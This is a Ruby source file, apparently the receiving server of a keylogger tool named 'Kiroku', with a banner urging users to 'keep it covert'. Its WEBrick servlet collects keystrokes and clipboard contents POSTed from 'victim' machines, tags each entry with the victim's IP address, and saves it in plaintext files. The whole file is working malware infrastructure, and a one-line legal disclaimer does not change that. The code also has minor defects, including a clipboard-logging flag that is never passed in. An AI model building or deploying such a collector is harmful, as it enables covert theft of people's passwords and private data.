=begin
   ▄█   ▄█▄  ▄█     ▄████████  ▄██████▄     ▄█   ▄█▄ ███    █▄
  ███ ▄███▀ ███    ███    ███ ███    ███   ███ ▄███▀ ███    ███
  ███▐██▀   ███▌   ███    ███ ███    ███   ███▐██▀   ███    ███
 ▄█████▀    ███▌  ▄███▄▄▄▄██▀ ███    ███  ▄█████▀    ███    ███
▀▀█████▄    ███▌ ▀▀███▀▀▀▀▀   ███    ███ ▀▀█████▄    ███    ███
  ███▐██▄   ███  ▀███████████ ███    ███   ███▐██▄   ███    ███
  ███ ▀███▄ ███    ███    ███ ███    ███   ███ ▀███▄ ███    ███
  ███   ▀█▀ █▀     ███    ███  ▀██████▀    ███   ▀█▀ ████████▀  (Server)
  ▀                ███    ███              ▀
                                                   Zephyr

Pro Tip: Keep it clean, keep it covert. Always ensure your actions align with legal boundaries and ethical standards. Use responsibly, and stay sharp:>>
=end

require 'webrick'
require 'json'
require 'logger'

class MyServlet < WEBrick::HTTPServlet::AbstractServlet
  # Initialize the servlet with a logger and file path
  def initialize(server, keystrokes_file_path, clipboard_file_path)
    super(server)
    @logger = Logger.new(STDOUT) # Log to standard output
    @logger.level = Logger::INFO # Set logging level to INFO
    @keystrokes_file_path = keystrokes_file_path # Path to the file where keystrokes will be saved
    @clipboard_file_path = clipboard_file_path # Path to the file where clipboard data will be saved
  end

  # Handle POST requests
  def do_POST(request, response)
    begin
      post_data = request.body.force_encoding('UTF-8') # Ensure the request body is treated as UTF-8 encoded
      data = JSON.parse(post_data)
      keyboard_data = data['keyboardData'] || ''
      clipboard_data = data['clipboardData'] || ''

      victim_ip = request.peeraddr.last # Retrive the IP Address of the victim as Identifier
      
      @logger.info("Received Keystrokes from  #{victim_ip}: #{keyboard_data}") # Log received keystrokes

      if @show_clipboard_in_logs
         @logger.info("Received Clipboard Data from #{victim_ip}: #{clipboard_data}") # Log received clipboard data
      end

      # Save the captures to the txt file
      save_to_file(@keystrokes_file_path, "#{victim_ip}: #{keyboard_data}")
      save_to_file(@clipboard_file_path, "#{victim_ip}: #{clipboard_data}")
      
      response.status = 200
      response.content_type = 'application/json'
      response.body = { 'status' => 'success', 'message' => 'Data received and saved successfully' }.to_json
    rescue JSON::ParserError => e
      @logger.error("JSON parsing error: #{e.message}") # Log JSON parsing errors
      response.status = 400
      response.content_type = 'application/json'
      response.body = { 'status' => 'error', 'message' => 'Invalid JSON' }.to_json
    rescue StandardError => e
      @logger.error("Server error: #{e.message}") # Log other server errors
      response.status = 500
      response.content_type = 'application/json'
      response.body = { 'status' => 'error', 'message' => 'Internal server error' }.to_json
    end
  end

  # Save the captured data to a file
  def save_to_file(file_path, data)
    File.open(file_path, 'a') do |file|
      file.puts(data) # Save data as plaintext
    end
  end
end

port = 8080 # Port number for the server (Change if needed)
keystrokes_file_path = 'saved_keystrokes.txt' # File to save captured keystrokes (Change filename if needed)
clipboard_file_path = 'saved_clipboard.txt' # File to save captured clipboard data (Change filename if needed)

logger = Logger.new(STDERR)
logger.level = Logger::INFO

# If the user didn't allow it, the captured clipboard will still be saved to saved_captures.txt by default
print "Do you want to display the captured clipboard data in the logs? (y/N): " 
show_clipboard_in_logs = gets.chomp.downcase == 'yes'

# Create and start the WEBrick server
server = WEBrick::HTTPServer.new :Port => port, :Logger => logger, :AccessLog => []
server.mount '/', MyServlet, keystrokes_file_path, clipboard_file_path # Mount the custom servlet

trap 'INT' do
  logger.info("Shutting down server...") # Log shutdown 
  server.shutdown # Shut the server down
end

server.start # Initialize the server
